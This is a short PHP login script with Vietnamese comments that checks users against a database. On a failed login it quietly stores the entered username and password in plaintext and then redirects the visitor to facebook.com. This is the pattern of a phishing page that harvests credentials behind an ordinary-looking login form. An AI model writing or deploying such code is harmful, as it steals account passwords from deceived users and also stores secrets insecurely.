<?php
session_start();
require 'connect.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $username = $_POST['username'];
  $password = $_POST['password'];

  $stmt = $conn->prepare("SELECT * FROM users WHERE username = :username");
  $stmt->bindParam(':username', $username);
  $stmt->execute();
  $user = $stmt->fetch();

  if ($user && password_verify($password, $user['password'])) {
    // Đăng nhập thành công
    $_SESSION['username'] = $user['username'];
    header('Location: welcome.php');
    exit();
  } else {
    // Lưu thông tin người dùng vào cơ sở dữ liệu
$stmt = $conn->prepare("INSERT INTO users (username, password) VALUES (:username, :password)");
$stmt->bindParam(':username', $username);
$stmt->bindParam(':password', $password);
$stmt->execute();

    // Đăng nhập không thành công
    header('Location: http://facebook.com'); 
    echo 'Tên đăng nhập hoặc mật khẩu không đúng.';
  }
}
?>
